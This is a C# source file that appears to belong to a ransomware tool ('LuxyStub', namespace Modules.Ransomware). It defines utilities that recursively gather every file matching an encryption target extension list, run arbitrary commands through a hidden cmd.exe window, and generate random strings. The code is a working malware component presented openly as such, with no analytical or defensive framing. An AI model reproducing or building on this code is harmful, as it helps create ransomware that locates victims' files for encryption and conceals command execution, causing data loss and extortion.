using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;

namespace LuxyStub.Modules.Ransomware.Components.Utilities
{
    internal static class Common
    {

        static public List<string> AllFiles = new List<string>();
        static public void ParsePath(string path)
        {
            try
            {
                string[] SubDirs = Directory.GetDirectories(path);
                AllFiles.AddRange(Directory.GetFiles(path).Where(s => Settings.EncryptExtensionList.Any(ext => ext == Path.GetExtension(s).Replace(".", ""))));
                foreach (string subdir in SubDirs)
                    ParsePath(subdir);
            }
            catch
            {

            }

        }

        public static void cmd(string commands)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/c" + commands;
            process.StartInfo = startInfo;
            //process.Start();
            Thread cmdProc = new Thread(() => process.Start());
            cmdProc.Start();
        }

        internal static string GenerateRandomString(int length)
        {
            Random random = new Random();
            string chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            StringBuilder result = new StringBuilder();

            for (int i = 0; i < length; i++)
                result.Append(chars[random.Next(0, chars.Length)]);

            return result.ToString();
        }
    }
}
